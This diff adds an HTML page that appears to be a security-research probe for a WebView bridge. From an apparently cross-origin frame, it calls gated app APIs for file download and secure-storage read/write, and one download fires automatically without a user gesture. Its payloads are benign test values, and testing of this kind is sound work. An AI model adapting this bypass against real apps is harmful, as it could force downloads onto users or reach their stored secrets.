@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Frame</title>
+<style>body{font:12px monospace;margin:8px;background:#fffbe6}button{margin:4px;padding:6px;font:inherit}</style>
+</head>
+<body>
+<div id="s">frame loaded</div>
+<button id="a">A: file</button>
+<button id="b">B: storage</button>
+<script>
+const s=document.getElementById('s');
+const TS=Date.now().toString(36);
+function post(name,obj){
+  const p=name+":"+JSON.stringify(obj);
+  try{ window.webkit.messageHandlers.EventHandler.postMessage(p); s.textContent="sent: "+p; }
+  catch(e){ s.textContent="no bridge: "+e.message; }
+}
+// авто-вызов gated API без жеста из кросс-origin фрейма
+setTimeout(()=>post("WebAppDownloadFile",{url:new URL('probe.txt','https://nbafan00.github.io/dl-check/').href,file_name:"probe-frame-auto-"+TS+".txt"}),1200);
+document.getElementById('a').onclick=()=>post("WebAppDownloadFile",{url:new URL('probe.txt','https://nbafan00.github.io/dl-check/').href,file_name:"probe-frame-click-"+TS+".txt"});
+document.getElementById('b').onclick=()=>{
+  post("WebAppSecureStorageSaveKey",{requestId:"frame-save-"+TS,key:"frame-key-"+TS,value:"written-from-cross-origin-frame"});
+  setTimeout(()=>post("WebAppSecureStorageGetKey",{requestId:"frame-get-"+TS,key:"frame-key-"+TS}),400);
+};
+</script>
+</body>
+</html>
